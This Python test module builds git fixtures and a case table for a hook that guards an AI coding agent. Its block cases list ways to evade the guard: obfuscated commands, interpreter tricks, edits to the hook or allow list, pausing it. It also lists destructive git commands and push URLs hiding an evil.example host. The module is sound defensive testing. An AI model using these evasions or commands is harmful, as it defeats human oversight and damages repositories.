"""Guard decision table and the throwaway git repos it runs against.

Each case is (id, want, rule, tool_name, tool_input, variant):
  want     "allow" or "block"
  rule     the rule a block must report (None for allow)
  variant  "<repo>" or "<repo>@<home>": which fixture checkout is the cwd and
           which directory NOT_ME_HOME points at
Strings in tool_input may use {F} (fixture root), {H} (the variant's
NOT_ME_HOME) and {P} (the plugin root); `expand` fills them in.
"""
from __future__ import annotations

import json
import os
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

Case = Tuple[str, str, Optional[str], str, Dict[str, Any], str]

OR, PB, FP, DG, SP = "other_repo", "protected_branches", "force_push", "destructive_git", "self_protect"

GH = "https://github.com/"
PLUGIN = Path(__file__).resolve().parent.parent  # {P}: the plugin root the hook protects

# scripts written into the "app" fixture under scripts/
SCRIPTS = {
    "clean.sh": "#!/bin/sh\necho cleaning\nrm -rf build\n",
    "ship.sh": "#!/bin/sh\ngit push https://github.com/acme/other HEAD\n",
    "unpause.sh": "#!/bin/sh\nnotme pause off\n",
    "drive.exp": "spawn notme allow-repo add acme/other\nexpect eof\n",
    "plain.exp": "spawn ls\nexpect eof\n",
}

# --- fixtures --------------------------------------------------------------

# repo -> (origin url, branch, project.md frontmatter or None for no config dir, extra setup)
REPOS: Dict[str, Tuple[str, str, Optional[str], str]] = {
    "app": (GH + "acme/app.git", "feature/x", "", "alias"),
    "other": (GH + "acme/other.git", "feature/x", "", ""),
    "sneaky": (GH + "acme/app.git", "feature/x", "", "pushurl"),
    "lookalike": (GH + "acme/app-fork.git", "feature/x", "", ""),
    "pushdefault": (GH + "acme/app.git", "feature/x", "", "pushdefault"),
    "main": (GH + "acme/app.git", "main", "", ""),
    "mainpboff": (GH + "acme/app.git", "main", "", ""),
    "cfgallow": (GH + "acme/app.git", "feature/x", "", ""),
    "tracker": (GH + "acme/app.git", "feature/x", "tracker: acme/issues\nrepos: [{name: acme/web}]", ""),
    "off": (GH + "acme/app.git", "feature/x", "", ""),
    "offnoconfirm": (GH + "acme/app.git", "feature/x", "", ""),
    "alloff": (GH + "acme/app.git", "main", "", ""),
    "repooff": (GH + "acme/app.git", "feature/x", "guard: {other_repo: off}\nconfirm_guard_off: [other_repo]", ""),
    "repoallow": (GH + "acme/app.git", "feature/x", "allow_repos: [acme/friend]", ""),
    "live": (GH + "acme/app.git", "feature/x", "mode: live", ""),
    "run": (GH + "acme/app.git", "feature/x", None, "run"),
    "running": (GH + "acme/app.git", "feature/x", "", "run"),
    "stale": (GH + "acme/app.git", "feature/x", None, "stale"),
    "runenv": (GH + "acme/app.git", "feature/x", None, "runenv"),
    "bare": (GH + "acme/app.git", "main", None, ""),
    "ssh": ("git@github.com:acme/app.git", "feature/x", "", ""),
    "sshurl": ("ssh://git@github.com/acme/app.git", "feature/x", "", ""),
}

# The repo layer may only tighten guard.*, mode, enabled and protected_branches, and its
# allow_repos entries are ignored; loosening settings live in the GLOBAL layer. Each repo
# here gets its own NOT_ME_HOME ("g-<repo>") whose project.md carries this frontmatter.
GLOBAL_LAYER: Dict[str, str] = {
    "mainpboff": "guard: {protected_branches: off}\nconfirm_guard_off: [protected_branches]",
    "cfgallow": "allow_repos: [acme/friend]",
    "off": "guard: {other_repo: off}\nconfirm_guard_off: [other_repo]",
    "offnoconfirm": "guard: {other_repo: off}",
    "alloff": "guard: {other_repo: off, protected_branches: off, force_push: off, destructive_git: off}\n"
              "confirm_guard_off: [other_repo, protected_branches, force_push, destructive_git]",
}

# home -> allowed-repos.json text (None = no file)
HOMES: Dict[str, Optional[str]] = {
    "h0": None,
    "hproj": json.dumps({"version": 1, "projects": {"acme/app": {"allow": [{"repo": "acme/friend"}]}}}),
    "hstar": json.dumps({"version": 1, "projects": {"*": {"allow": [{"repo": "acme/friend"}]}}}),
    "hmismatch": json.dumps({"version": 1, "projects": {"acme/zzz": {"allow": [{"repo": "acme/friend"}]}}}),
    "hbad": "{not json",
    # confirms the "tracker" fixture's repo-layer tracker and companion
    "htracker": json.dumps({"version": 1, "projects": {"acme/app": {"allow": [{"repo": "acme/issues"},
                                                                             {"repo": "acme/web"}]}}}),
}


def hermetic_env(root: Path) -> Dict[str, str]:
    """Environment that keeps the developer's own git and not-me config out of the run."""
    user = Path(root) / "userhome"
    user.mkdir(parents=True, exist_ok=True)
    gitconfig = user / ".gitconfig"
    if not gitconfig.exists():
        gitconfig.write_text("", encoding="utf-8")
    env = {k: v for k, v in os.environ.items() if not k.startswith(("GIT_", "CLAUDE_", "NOT_ME_"))}
    env.update(HOME=str(user), USERPROFILE=str(user), GIT_CONFIG_GLOBAL=str(gitconfig), GIT_CONFIG_NOSYSTEM="1",
               NOT_ME_HOME=str(Path(root) / "homes" / "h0"))
    return env


def _git(args: List[str], cwd: Path, env: Dict[str, str]) -> None:
    subprocess.run(["git", *args], cwd=str(cwd), env=env, check=True, capture_output=True)


def build_fixtures(root: Path) -> Dict[str, str]:
    """Create every fixture repo and home under root. Returns the hermetic env."""
    root = Path(root).resolve()
    env = hermetic_env(root)
    for name, text in HOMES.items():
        home = root / "homes" / name
        home.mkdir(parents=True, exist_ok=True)
        if text is not None:
            (home / "allowed-repos.json").write_text(text, encoding="utf-8")
    for repo_name, front in GLOBAL_LAYER.items():
        home = root / "homes" / f"g-{repo_name}"
        home.mkdir(parents=True, exist_ok=True)
        (home / "project.md").write_text(f"---\nschema: 1\n{front}\n---\n# Project\n", encoding="utf-8")
    for name, (origin, branch, front, extra) in REPOS.items():
        repo = root / name
        repo.mkdir(parents=True, exist_ok=True)
        _git(["init", "-q"], repo, env)
        _git(["symbolic-ref", "HEAD", f"refs/heads/{branch}"], repo, env)
        _git(["remote", "add", "origin", origin], repo, env)
        (repo / "README.md").write_text("# fixture\n", encoding="utf-8")
        if extra == "alias":
            _git(["config", "alias.pp", "push https://github.com/acme/other"], repo, env)
            scripts = repo / "scripts"
            scripts.mkdir(exist_ok=True)
            for script, text in SCRIPTS.items():
                (scripts / script).write_text(text, encoding="utf-8")
                os.chmod(str(scripts / script), 0o755)
        elif extra == "pushurl":
            _git(["remote", "set-url", "--push", "origin", "git@github.com:acme/lib.git"], repo, env)
        elif extra == "pushdefault":
            _git(["remote", "add", "up", GH + "acme/lib.git"], repo, env)
            _git(["config", "remote.pushDefault", "up"], repo, env)
        elif extra in ("run", "stale"):
            marker = repo / ".git" / "not-me" / "active-run"
            marker.parent.mkdir(parents=True, exist_ok=True)
            started = time.time() - (7 * 3600 if extra == "stale" else 0)
            stamp = time.strftime("%Y-%m-%dT%H:%M:%S+00:00", time.gmtime(started))
            marker.write_text(json.dumps({"started": stamp, "run_id": f"fixture-{name}"}) + "\n", encoding="utf-8")
            # mtime says the opposite of "started": freshness must come from the JSON alone
            mtime = time.time() - (0 if extra == "stale" else 7 * 3600)
            os.utime(str(marker), (mtime, mtime))
        elif extra == "runenv":
            # a real run that logged to $NOT_ME_LOG_ROOT: its marker still sits in the git common dir
            from notme import runlog
            logs = runlog.log_root(repo, None, {"NOT_ME_LOG_ROOT": str(root / "custom-logs" / name)})
            runlog.RunLog.start(logs, "fixture", name, project_dir=repo)
        if front is not None:
            cfg = repo / ".claude" / "not-me"
            cfg.mkdir(parents=True, exist_ok=True)
            body = "schema: 1\n" + (front + "\n" if front else "")
            (cfg / "project.md").write_text(f"---\n{body}---\n# Project\n", encoding="utf-8")
    return env


def variant_paths(root: Path, variant: str) -> Tuple[Path, Path]:
    """(cwd, NOT_ME_HOME) for a variant."""
    repo, _, home = variant.partition("@")
    default = f"g-{repo}" if repo in GLOBAL_LAYER else "h0"
    return Path(root).resolve() / repo, Path(root).resolve() / "homes" / (home or default)


def expand(value: Any, root: Path, home: Path) -> Any:
    if isinstance(value, str):
        return value.replace("{F}", str(Path(root).resolve())).replace("{H}", str(home)).replace("{P}", str(PLUGIN))
    if isinstance(value, dict):
        return {k: expand(v, root, home) for k, v in value.items()}
    if isinstance(value, list):
        return [expand(v, root, home) for v in value]
    return value


def event_for(case: Case, root: Path) -> Dict[str, Any]:
    _, _, _, tool, tin, variant = case
    cwd, home = variant_paths(root, variant)
    return {"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": expand(tin, root, home),
            "cwd": str(cwd)}


# --- the table -------------------------------------------------------------

CASES: List[Case] = []


def _add(want: str, rule: Optional[str], tool: str, tin: Dict[str, Any], variant: str) -> None:
    CASES.append((f"G{len(CASES) + 1:03d}", want, rule, tool, tin, variant))


def bash(want: str, rule: Optional[str], cmd: str, variant: str = "app") -> None:
    _add(want, rule, "Bash", {"command": cmd}, variant)


def mcp(want: str, rule: Optional[str], tool: str, tin: Dict[str, Any], variant: str = "app") -> None:
    _add(want, rule, tool, tin, variant)


def write(want: str, rule: Optional[str], tool: str, path: str, variant: str = "app") -> None:
    key = "notebook_path" if tool == "NotebookEdit" else "file_path"
    _add(want, rule, tool, {key: path}, variant)


A, B = "allow", "block"

# Ported reference cases. The reference allowed one fixed repo; here the
# allowed repo is the origin of the checkout the call runs in, so its
# "run from the other checkout" cases become `cd` / `git -C` into it.
# Reads pass anywhere.
bash(A, None, "gh pr view 5 --repo acme/other")
bash(A, None, "gh pr list --repo acme/lib --json number")
bash(A, None, "gh api repos/acme/lib/pulls")
bash(A, None, "gh api -X GET repos/acme/lib/issues -f state=open")
bash(A, None, 'gh api graphql -f query="query { viewer { login } }"')
bash(A, None, "git status && git log --oneline", "other")
bash(A, None, "gh --version")
# Writes to this repo pass.
bash(A, None, "gh pr create --repo acme/app --title x --body y")
bash(A, None, "gh pr comment 5 --repo acme/app --body hi")
bash(A, None, "gh pr edit 5 -R ACME/APP --add-label x")
bash(A, None, "gh api -X POST repos/acme/app/issues/1/comments -f body=x")
bash(A, None, "git push origin HEAD")
bash(A, None, "git push -u origin feature")
bash(A, None, "git push https://github.com/acme/app.git HEAD")
bash(A, None, "cd {F}/live && git push")  # another checkout of acme/app
bash(A, None, "cd {F}/other && git -C {F}/live push")
bash(A, None, 'git commit -m "fix: x"')
# Writes elsewhere are blocked.
bash(B, OR, "gh pr comment 5 --repo acme/other --body hi")
bash(B, OR, "gh pr comment 5 --repo=acme/other --body hi")
bash(B, PB, "gh pr merge https://github.com/acme/lib/pull/9")
bash(B, OR, "gh issue create --repo acme/internal --title x")
bash(B, OR, "gh pr create --title x", "other")
bash(B, OR, "gh pr comment 5 --repo acme/app-fork --body hi")
bash(B, OR, "gh pr comment 5 --repo evil/acme/app --body hi")
bash(B, OR, "gh run rerun 123 --repo acme/lib")
bash(B, OR, "gh repo create acme/new-thing --public")
bash(B, OR, "gh repo fork")
bash(B, OR, "gh gist create notes.txt")
bash(B, OR, "gh -R acme/lib pr create")
bash(B, OR, "gh api -X POST repos/acme/lib/issues/1/comments -f body=x")
bash(B, OR, "gh api --method=PATCH repos/acme/lib/pulls/1 -f title=x")
bash(B, OR, "gh api repos/acme/lib/issues/1/comments -F body=x")
bash(B, DG, "gh api -XDELETE repos/acme/lib/labels/x")  # any API DELETE is now a human action
bash(B, OR, "gh api user/repos -f name=x")
bash(B, OR, 'gh api graphql -f query="mutation { addComment(input:{}) { clientMutationId } }"')
bash(B, OR, "gh api graphql -F query=@q.graphql")
bash(B, OR, "gh api repos/{owner}/{repo}/issues -f title=x")
bash(B, OR, "gh pr create --title x --body y")
bash(B, OR, "git -C {F}/other push origin HEAD")
bash(B, OR, "git -C {F}/other push")
bash(B, OR, "cd {F}/other; git push")
bash(B, OR, "git push https://github.com/acme/lib.git HEAD")
bash(B, OR, "git push --repo=https://github.com/acme/lib.git HEAD")
bash(B, OR, "git push git@gitlab.com:x/y.git HEAD")
bash(B, OR, "git push nosuchremote HEAD")
bash(B, OR, "git push origin HEAD", "sneaky")
bash(B, OR, "git -C {F}/lookalike push")
bash(B, OR, "git push", "pushdefault")
bash(B, OR, "git -c remote.origin.pushurl=git@github.com:acme/lib.git push")
bash(B, OR, "git remote set-url origin https://github.com/acme/lib.git && git push")
bash(B, OR, "git config remote.origin.pushurl https://github.com/acme/lib.git")
bash(B, OR, "git -C {F}/other commit -m x")
bash(B, OR, 'bash -c "gh pr comment 5 --repo acme/lib --body x"')
bash(B, OR, "eval gh pr create --repo acme/lib")
bash(B, OR, "FOO=1 env /usr/local/bin/gh pr comment 1 --repo acme/lib --body x")
bash(B, OR, "true && gh pr close 3 --repo acme/lib")
# MCP: read-only names pass, anything else must name an allowed repo.
mcp(A, None, "mcp__github__get_pull_request", {"owner": "acme", "repo": "lib", "pullNumber": 1})
mcp(A, None, "mcp__github__search_issues", {"query": "repo:acme/lib"})
mcp(A, None, "mcp__github__add_issue_comment", {"owner": "acme", "repo": "app", "issue_number": 1, "body": "x"})
mcp(B, OR, "mcp__github__add_issue_comment", {"owner": "acme", "repo": "lib", "issue_number": 1, "body": "x"})
mcp(B, OR, "mcp__github__add_issue_comment", {"owner": "acme", "repo": "app-fork", "issue_number": 1,
                                                "body": "x"})
mcp(B, OR, "mcp__github__create_repository", {"name": "x"})
mcp(B, OR, "mcp__github__get_pull_request_and_merge", {"owner": "acme", "repo": "lib"})
mcp(B, OR, "mcp__github__run_workflow", {"owner": "acme", "repo": "lib", "workflow_id": "x"})
# Bypasses found in review of the reference guard.
bash(B, OR, "echo $(gh pr comment 1 -R acme/other -b hi)")
bash(B, OR, "echo `gh pr comment 1 -R acme/other -b hi`")
bash(B, OR, "{ gh pr comment 1 -R acme/other -b hi; }")
bash(B, OR, "if true; then gh pr comment 1 -R acme/other -b hi; fi")
bash(B, OR, "! gh pr comment 1 -R acme/other -b hi")
bash(B, OR, "timeout 30 gh pr comment 1 -R acme/other -b hi")
bash(B, OR, "gh pr comment 1 -R acme/app -R acme/other -b hi")
bash(B, OR, 'gh pr comment 1 -b "-R acme/app" -R acme/other')
bash(B, OR, "gh pr comment https://github.com/acme/other/pull/1 -R acme/app -b hi")
bash(B, OR, "gh issue comment https://github.com/acme/other/issues/1 --repo acme/app -b hi")
bash(B, OR, "gh api graphql --input m.json")
bash(B, OR, "cat m.json | gh api graphql --input -")
bash(B, OR, "gh api -X POST -f repos/acme/app/x=1 repos/acme/other/issues/1/comments")
bash(B, OR, "gh api -X POST -H repos/acme/app/ repos/acme/other/issues/1/comments -f body=x")
bash(B, OR, "GIT_DIR={F}/other/.git git push")
bash(B, OR, "git --git-dir {F}/other/.git push")
bash(B, OR, "git --git-dir={F}/other/.git push origin feature")
bash(B, OR, "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl "
            "GIT_CONFIG_VALUE_0=https://github.com/acme/other git push")
bash(B, OR, "export GIT_DIR=/x/.git; git push")
bash(B, OR, 'git config alias.p "push https://github.com/acme/other"')
bash(B, OR, "git subtree push --prefix=x https://github.com/acme/other main")
bash(B, OR, "git send-pack https://github.com/acme/other main")
bash(B, OR, 'gh alias set --shell z "gh api -X POST repos/acme/other/issues/1/comments -f body=x"')
bash(B, OR, "gh z --repo acme/app")
bash(B, OR, "gh extension exec foo")
bash(B, OR, "git pp")
bash(A, None, "gh alias list")
bash(A, None, 'gh api repos/acme/app/pulls --jq ".[].number"')
write(B, OR, "Edit", "{F}/app/.git/config")
write(B, OR, "Write", "~/.gitconfig")
write(A, None, "Write", "{F}/app/src/index.js")
mcp(B, OR, "mcp__plugin_github_github__create_issue", {"owner": "acme", "repo": "x", "title": "x"})
mcp(A, None, "mcp__plugin_github_github__get_issue", {"owner": "acme", "repo": "x", "issue_number": 1})

PORTED = len(CASES)

# Allow sources: project config, tracker/repos, global allow list per project and "*".
FRIEND = "gh pr comment 1 --repo acme/friend -b x"
bash(A, None, FRIEND, "cfgallow")
bash(B, OR, FRIEND, "app")
bash(A, None, FRIEND, "app@hproj")
bash(A, None, FRIEND, "app@hstar")
bash(B, OR, FRIEND, "app@hmismatch")
bash(B, OR, FRIEND, "app@hbad")
bash(A, None, "gh issue comment 1 --repo acme/issues -b x", "tracker@htracker")
bash(A, None, "gh pr create --repo acme/web --title x --body y", "tracker@htracker")
mcp(A, None, "mcp__github__create_issue", {"owner": "acme", "repo": "friend", "title": "x"}, "app@hstar")
# Near matches.
bash(B, OR, "gh pr comment 1 --repo acme/ap -b x")
bash(B, OR, "gh pr comment 1 --repo acme/app2 -b x")
bash(B, OR, "gh pr comment 1 --repo acme-app/app -b x")
bash(B, OR, "git push https://github.com/acme/app-fork.git HEAD")
# Origin forms.
bash(A, None, "gh pr comment 1 --repo acme/app -b x", "ssh")
bash(B, OR, "gh pr comment 1 --repo acme/other -b x", "ssh")
bash(A, None, "gh pr comment 1 --repo acme/app -b x", "sshurl")
# Rules switched off; an unconfirmed off is ignored.
bash(A, None, "gh pr comment 1 --repo acme/other -b x", "off")
bash(A, None, "git push https://github.com/acme/lib.git HEAD", "off")
bash(B, OR, "gh pr comment 1 --repo acme/other -b x", "offnoconfirm")
bash(B, FP, "git push --force origin feature/x", "off")
bash(B, PB, "echo $(git push https://github.com/acme/lib.git HEAD)", "off")
bash(A, None, "git push --force https://github.com/acme/lib.git main", "alloff")
bash(A, None, "git commit -m x", "mainpboff")
# Activation: config missing but a run is active -> guarded with origin only.
bash(B, OR, "gh pr comment 1 --repo acme/other -b x", "run")
bash(A, None, "gh pr comment 1 --repo acme/app -b x", "run")
bash(A, None, "gh pr comment 1 --repo acme/other -b x", "stale")
bash(A, None, "gh pr comment 1 --repo acme/other -b x", "bare")
bash(A, None, "git push --force origin main", "bare")
write(A, None, "Edit", "{F}/bare/.git/config", "bare")
# Dry-run vs live makes no difference to the guard.
bash(B, OR, "gh pr comment 1 --repo acme/other -b x", "live")
bash(A, None, "gh pr comment 1 --repo acme/app -b x", "live")
# GraphQL: the CLI's own board calls carry the marker.
MUT = 'gh api graphql -f query="mutation { updateProjectV2ItemFieldValue(input:{}) { clientMutationId } }"'
bash(B, OR, MUT)
bash(A, None, MUT + " --not-me-board")
# Force push.
bash(B, FP, "git push --force")
bash(B, FP, "git push -f origin feature/x")
bash(B, FP, "git push --force-with-lease origin feature/x")
bash(B, FP, "git push origin +feature/x")
bash(B, FP, "git push -fu origin feature/x")
bash(B, FP, "git push --delete origin feature/x")
bash(B, FP, "git push origin :feature/x")
bash(B, FP, "gh pr merge 1 --admin --repo acme/app")
bash(A, None, "git push -u origin feature/x")
# Protected branches.
bash(B, PB, "git commit -m x", "main")
bash(B, PB, "git push", "main")
bash(B, PB, "git push origin HEAD", "main")
bash(B, PB, "git push origin main")
bash(B, PB, "git push origin HEAD:main")
bash(B, PB, "git push origin feature/x:refs/heads/develop")
bash(B, PB, "git push --all origin")
bash(B, PB, "git merge feature/x", "main")
bash(B, PB, "git rebase origin/main", "main")
bash(B, PB, "git reset --soft HEAD~1", "main")
bash(A, None, "git merge --abort", "main")
bash(A, None, "git reset", "main")
bash(A, None, "git status", "main")
bash(B, PB, "gh pr merge 1 --repo acme/app --squash")
bash(B, PB, "gh api -X PUT repos/acme/app/pulls/1/merge")
bash(B, PB, "git checkout main && git commit -m x")
bash(A, None, "git checkout -b feature/y && git commit -m x", "main")
bash(A, None, "git merge main")
bash(A, None, "git rebase origin/main")
# Destructive git.
bash(B, DG, "git reset --hard origin/main", "main")
bash(A, None, "git reset --hard HEAD~1")
bash(B, DG, "git branch -D main")
bash(B, DG, "git branch --delete --force develop")
bash(B, DG, "git branch -f main HEAD")
bash(A, None, "git branch -D feature/old")
bash(B, DG, "git clean -fdx")
bash(B, DG, "git clean -ffdx")
bash(A, None, "git clean -fd")
bash(B, DG, "rm -rf .git")
bash(B, DG, "rm -rf sub/.git")
bash(B, DG, "rm -rf {F}/app")
bash(B, DG, "rm -rf .")
bash(A, None, "rm -rf node_modules build")
bash(B, DG, "gh repo delete acme/app --yes")
bash(B, DG, "git push --mirror")
bash(B, DG, "git filter-branch --tree-filter true HEAD")
bash(B, DG, "git update-ref -d refs/heads/feature/x")
bash(B, DG, "gh api -X DELETE repos/acme/app")
# Self-protection is always on, even with every rule off.
write(B, SP, "Write", "{H}/allowed-repos.json")
write(B, SP, "Edit", "{H}/allowed-repos.json", "alloff")
bash(B, SP, "notme allow-repo add acme/other")
bash(B, SP, "notme allow-repo acme/other --everywhere", "alloff")
bash(B, SP, "echo {} > {H}/allowed-repos.json")
write(B, SP, "Write", "{F}/running/.claude/not-me/project.md", "running")
write(B, SP, "Edit", "{H}/standards.md", "running")
write(B, SP, "Write", "{F}/run/.claude/not-me/project.md", "run")
write(A, None, "Write", "{F}/app/.claude/not-me/project.md")
write(A, None, "Edit", "{H}/standards.md")
# Windows path forms.
write(B, OR, "Edit", "C:\\x\\.git\\config")
write(B, OR, "Write", "D:\\work\\.gitconfig")
write(B, OR, "NotebookEdit", "C:\\x\\.GIT\\hooks\\pre-push")
write(A, None, "Write", "C:\\x\\.github\\workflows\\ci.yml")
# Heredocs are data unless fed to a shell.
bash(A, None, "git commit -m \"$(cat <<'EOF'\nfix: x\n\ngit push is described here\nEOF\n)\"")
bash(A, None, "gh pr create --repo acme/app --title x --body \"$(cat <<'EOF'\nSee `git log`.\nEOF\n)\"")
bash(B, OR, "bash <<EOF\ngit push https://github.com/acme/lib.git HEAD\nEOF")
# Odds and ends.
bash(B, OR, "gh auth login")
bash(A, None, "gh auth status")
bash(B, OR, "git -c alias.x=push x")
bash(A, None, "gh pr view 1")
bash(A, None, "ls -la && cat README.md")
mcp(A, None, "mcp__github__list_pull_requests", {"owner": "acme", "repo": "lib"})
mcp(B, OR, "mcp__github__merge_pull_request", {"owner": "acme", "repo": "lib", "pullNumber": 1})
_add(A, None, "Read", {"file_path": "{F}/app/.git/config"}, "app")

# Fix round 1: the seven reported bypasses (ids in BYPASS_IDS).
_first_bypass = len(CASES)
bash(B, OR, "${GH:-gh} pr comment 5 -R acme/other -F x.md")
bash(B, OR, "find . -exec gh pr comment 5 -R acme/other -F {} \\;")
bash(B, OR, "python3 -c 'import subprocess; subprocess.run([\"gh\", \"pr\", \"comment\", \"5\", \"-R\", "
            "\"acme/other\", \"-b\", \"x\"])'")
bash(B, OR, "gh api --method PUT repos/acme/other/issues/5/labels --input x.json")
bash(B, DG, "gh secret set TOKEN --repo acme/app --body x")
bash(B, OR, "bash ./scripts/ship.sh")
write(B, SP, "Write", "{P}/hooks/repo_guard.py")
BYPASS_IDS = [c[0] for c in CASES[_first_bypass:]]
# 1. command names built from variables, quotes or backslashes.
bash(B, OR, "$GH pr comment 1 -R acme/app -b x")
bash(B, OR, "g''h pr comment 1 -R acme/other -b x")
bash(B, OR, "\\git push https://github.com/acme/other.git HEAD")
bash(B, OR, "g\\it push https://github.com/acme/other.git HEAD")
bash(B, OR, "/usr/bin/gh pr comment 1 -R acme/other -b x")
bash(B, OR, "exec gh pr comment 1 -R acme/other -b x")
bash(B, OR, "command gh pr comment 1 -R acme/other -b x")
bash(B, OR, "time gh pr comment 1 -R acme/other -b x")
# 2. commands run by find, xargs, parallel, env -S, sudo.
bash(B, PB, "find . -name x -execdir git push origin main \\;")
bash(A, None, "find . -name '*.md' -exec cat {} \\;")
bash(B, OR, "ls | xargs -I{} gh pr comment {} -R acme/other -b x")
bash(A, None, "ls | xargs -n1 echo")
bash(B, OR, "parallel gh pr comment {} -R acme/other -b x ::: 1 2")
bash(B, OR, "env -S \"gh pr comment 1 -R acme/other -b x\"")
bash(B, OR, "sudo -u bot gh pr comment 1 -R acme/other -b x")
# 3. inline interpreter code.
bash(B, OR, "node -e 'require(\"child_process\").execSync(\"git push\")'")
bash(B, OR, "perl -e 'system(\"gh pr merge 1\")'")
bash(B, OR, "php -r 'echo shell_exec(\"git push\");'")
bash(A, None, "python3 -c 'print(1)'")
bash(A, None, "ruby -e 'puts 1'")
bash(B, OR, "curl -X POST https://api.github.com/repos/acme/other/issues -d x")
# 4. gh api method and field spellings.
bash(B, OR, "gh api -X=PUT repos/acme/other/issues/5/labels -f labels=x")
bash(B, OR, "gh api -iXPOST repos/acme/other/issues/1/comments")
bash(B, OR, "gh api -ifbody=x repos/acme/other/issues/1/comments")
bash(B, OR, "gh api -XPUT repos/acme/other/issues/1/lock")
bash(B, OR, "gh api --hostname github.com -X POST repos/acme/other/issues -f title=x")
bash(A, None, "gh api --method PUT repos/acme/app/issues/5/labels --input x.json")
# 5. settings, secrets and deletion are always human actions.
bash(B, DG, "gh variable set X --repo acme/app --body y")
bash(B, DG, "gh issue delete 1 --repo acme/app --yes")
bash(B, DG, "gh repo edit acme/app --visibility public")
bash(B, DG, "gh release delete v1 --repo acme/app")
bash(B, DG, "gh label delete bug --repo acme/app")
bash(B, DG, "gh workflow disable ci.yml --repo acme/app")
bash(B, DG, "gh ruleset list --repo acme/app")
bash(B, DG, "gh api -X DELETE repos/acme/app/issues/comments/1")
bash(B, DG, "gh api -X PATCH repos/acme/app -f private=false")
bash(B, DG, "gh api -X PUT repos/acme/app/branches/main/protection --input p.json")
# 6. scripts are read and scanned.
bash(A, None, "sh scripts/clean.sh")
bash(A, None, "./scripts/clean.sh")
bash(B, OR, "source scripts/ship.sh")
bash(B, OR, ". scripts/ship.sh")
bash(B, OR, "./scripts/ship.sh")
bash(B, OR, "zsh scripts/missing.sh")
# 7. the plugin's own files.
write(B, SP, "Edit", "{P}/notme/guard.py")
write(B, SP, "MultiEdit", "{P}/bin/notme")
write(B, SP, "Write", "{P}/cli/notme.py")
write(B, SP, "Write", "{P}/skills/x/SKILL.md", "alloff")
write(A, None, "Write", "{P}/README.md")
# Confirmed behaviour kept as rows.
bash(B, OR, "git push -o ci.skip origin HEAD")
bash(B, OR, "gh pr comment 1 --repo acme/other.git -b x")
bash(B, OR, "gh pr comment 1 -R ACME/OTHER -b x")
bash(B, PB, "gh pr merge 1 --auto --repo acme/app")
bash(B, OR, "gh pr close 1 --repo acme/other")
bash(B, OR, "gh release create v1 --repo acme/other")
bash(B, OR, "gh workflow run ci.yml --repo acme/other")
bash(B, OR, "gh pr comment 1 -b \"hi\nthere\" -R acme/other")
write(B, OR, "Write", "{F}/app/.git/hooks/pre-push")
# Addendum 11: checkout of a file does not change the tracked branch.
bash(B, PB, "git checkout README.md && git commit -m x", "main")
bash(A, None, "git checkout feat/x && git commit -m x", "main")
# Addendum 12: options of prefix words are dropped.
bash(B, FP, "env -i git push --force origin main")
bash(B, PB, "time -p git commit -m x", "main")
bash(B, PB, "nice -n 5 git commit -m x", "main")
bash(B, FP, "timeout -s KILL 30 git push --force")
bash(B, OR, "caffeinate -t 60 gh pr comment 1 -R acme/other -b x")
# Addendum 13: redirections are not arguments.
bash(A, None, "git push 2>&1")
bash(A, None, "git push >/dev/null")
bash(A, None, "git push 2>&1 | tail")
bash(A, None, "git push > push.log 2>&1")
bash(B, FP, "git push --force 2>&1")
bash(B, OR, "gh pr comment 1 -R acme/other -b x &> /dev/null")

# The repo layer cannot loosen: an off and an allow_repos entry there are ignored.
bash(B, OR, "gh pr comment 1 --repo acme/other -b x", "repooff")
bash(B, OR, FRIEND, "repoallow")
_repo_allow_id = CASES[-1][0]
# A tracker or companion named only in the repo layer (committed, so untrusted) needs the
# global allow list to confirm it; the "tracker" fixture's are confirmed only under htracker.
bash(B, OR, "gh pr create --repo acme/web --title x --body y", "tracker")
_unconfirmed_id = CASES[-1][0]
bash(B, OR, "gh issue comment 1 --repo acme/issues -b x", "tracker")
# The active-run marker does not move with the log root: a run logging to $NOT_ME_LOG_ROOT still activates the guard.
bash(B, FP, "git push --force origin feature/x", "runenv")
# A push URL whose userinfo hides the real host: git would contact evil.example, not github.com.
bash(B, OR, "git push https://evil.example#@github.com/acme/app HEAD")
bash(B, OR, "git push https://evil.example?x@github.com/acme/app HEAD")
bash(B, OR, "gh pr comment https://evil.example#@github.com/acme/app/pull/1 -b x")
# The not-me CLI trusts its project, home and operator: nothing may re-point them (always on).
bash(A, None, "notme config")
bash(A, None, "notme status")
bash(A, None, "notme allow-repo list")
bash(A, None, "{P}/bin/notme status", "alloff")
bash(A, None, "LC_ALL=C git status")
bash(A, None, "LC_ALL=C NO_COLOR=1 gh pr comment 1 --repo acme/app -b x")
bash(A, None, "cd scripts && notme status")
bash(A, None, "notme pause on")
bash(A, None, "notme git worktree-add {F}/app/.git/not-me/worktrees/feat-x")
bash(B, SP, "notme --project-dir {F}/other status")
bash(B, SP, "notme --proj={F}/other status", "alloff")
bash(B, SP, "python3 {P}/cli/notme.py --project-dir {F}/other config")
bash(B, SP, "NOT_ME_HOME=/tmp/h notme status", "alloff")
bash(B, SP, "export CLAUDE_PROJECT_DIR={F}/other; notme status")
bash(B, SP, "HOME=/tmp notme config")
bash(B, SP, "GH_TOKEN=x {P}/bin/notme status")
bash(B, SP, "env GITHUB_TOKEN=x bash {P}/bin/notme status")
bash(B, SP, "unset NOT_ME_HOME; notme status")
bash(B, SP, "cd {F}/other && notme status")
bash(B, SP, "cd /tmp; n'ot'me status", "alloff")
bash(B, SP, "env -C {F}/other notme status")
bash(B, SP, 'notme allow-rep""o add acme/other')
bash(B, SP, "notme 'allow-'repo remove acme/app")
bash(B, SP, "notme allow-re\\po acme/other --every", "alloff")
bash(B, SP, "notme ${X:-allow}-repo acme/other --ev")
bash(B, SP, "notme allow-repo acme/other")
bash(B, SP, "export NOT_ME_OPERATOR_CONFIRM=1")
bash(B, SP, "env NOT_ME_OPERATOR_CONFIRM=yes notme status")
bash(B, SP, "NOT_ME_OPERATOR_CONFIRM=1 ls", "alloff")
bash(B, SP, "notme pause off")
bash(B, SP, "notme pause 'of'f", "alloff")
bash(B, SP, "bash {P}/bin/notme pause --off")
bash(B, SP, "notme git worktree-add /tmp/wt")
bash(B, SP, "notme git worktree-add {F}/app/.git/not-me/worktrees/../../hooks")
bash(B, SP, "notme git worktree-add")
# Any other VAR=value in front of gh, git or notme cannot be checked.
bash(B, OR, "GH_REPO=acme/app gh pr comment 1 -b x")
